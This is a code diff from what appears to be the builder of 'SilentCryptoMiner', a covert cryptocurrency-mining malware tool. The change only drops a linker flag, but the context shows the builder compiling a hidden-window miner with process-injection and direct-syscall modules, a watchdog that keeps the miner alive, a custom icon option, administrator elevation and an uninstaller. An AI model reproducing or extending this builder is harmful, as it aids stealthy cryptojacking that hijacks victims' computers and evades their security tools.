@@ -245,7 +245,7 @@ namespace SilentCryptoMiner
                     BuildLog("Compiling Watchdog...");
                     string watchdogpath = savePathBase + "-watchdog.exe";
                     string watchdogcode = Properties.Resources.watchdog.Replace("$WATCHDOGSET", string.Join(",", watchdogSet)).Replace("$MINERCOUNT", watchdogSet.Count.ToString());
-                    if (Codedom.NativeCompiler(watchdogpath, watchdogcode, $"-m64 -Wl,-subsystem,windows -Wno-multichar -municode -DUNICODE \"{Path.GetFileNameWithoutExtension(watchdogpath)}.cpp\" UFiles\\*.cpp UFiles\\Syscalls\\syscalls.c UFiles\\Syscalls\\syscallsstubs.std.x64.s -DWINVER=0x0601 -D_WIN32_WINNT=0x0601 -l:libd3d9.a -O3 -s -o \"{Path.GetFileNameWithoutExtension(watchdogpath)}.exe\"", "", false, toggleAdministrator.Checked))
+                    if (Codedom.NativeCompiler(watchdogpath, watchdogcode, $"-m64 -Wl,-subsystem,windows -Wno-multichar -municode -DUNICODE \"{Path.GetFileNameWithoutExtension(watchdogpath)}.cpp\" UFiles\\*.cpp UFiles\\Syscalls\\syscalls.c UFiles\\Syscalls\\syscallsstubs.std.x64.s -DWINVER=0x0601 -D_WIN32_WINNT=0x0601 -O3 -s -o \"{Path.GetFileNameWithoutExtension(watchdogpath)}.exe\"", "", false, toggleAdministrator.Checked))
                     {
                         watchdogdata = File.ReadAllBytes(watchdogpath);
                         File.Delete(watchdogpath);
@@ -282,7 +282,7 @@ namespace SilentCryptoMiner
                 minerbuilder.Replace("$RESOURCES", resources.ToString());
 
                 BuildLog("Compiling Miner...");
-                if (Codedom.NativeCompiler(savePathBase + ".exe", minerbuilder.ToString(), $"-m64 -Wl,-subsystem,windows -Wno-multichar -municode -DUNICODE \"{Path.GetFileNameWithoutExtension(savePathBase)}.cpp\" UFiles\\*.cpp UFiles\\Injection\\*.cpp UFiles\\Syscalls\\syscalls.c UFiles\\Syscalls\\syscallsstubs.std.x64.s resource.o -DWINVER=0x0601 -D_WIN32_WINNT=0x0601 -l:libd3d9.a -O3 -s -o \"{Path.GetFileNameWithoutExtension(savePathBase) + ".exe"}\"", (chkIcon.Checked && txtIconPath.Text != "" ? txtIconPath.Text : null), chkAssembly.Checked, toggleAdministrator.Checked))
+                if (Codedom.NativeCompiler(savePathBase + ".exe", minerbuilder.ToString(), $"-m64 -Wl,-subsystem,windows -Wno-multichar -municode -DUNICODE \"{Path.GetFileNameWithoutExtension(savePathBase)}.cpp\" UFiles\\*.cpp UFiles\\Injection\\*.cpp UFiles\\Syscalls\\syscalls.c UFiles\\Syscalls\\syscallsstubs.std.x64.s resource.o -DWINVER=0x0601 -D_WIN32_WINNT=0x0601 -O3 -s -o \"{Path.GetFileNameWithoutExtension(savePathBase) + ".exe"}\"", (chkIcon.Checked && txtIconPath.Text != "" ? txtIconPath.Text : null), chkAssembly.Checked, toggleAdministrator.Checked))
                 {
                     BuildLog("Compiling Uninstaller...");
                     Codedom.UninstallerCompiler(savePathBase + "-uninstaller.exe");
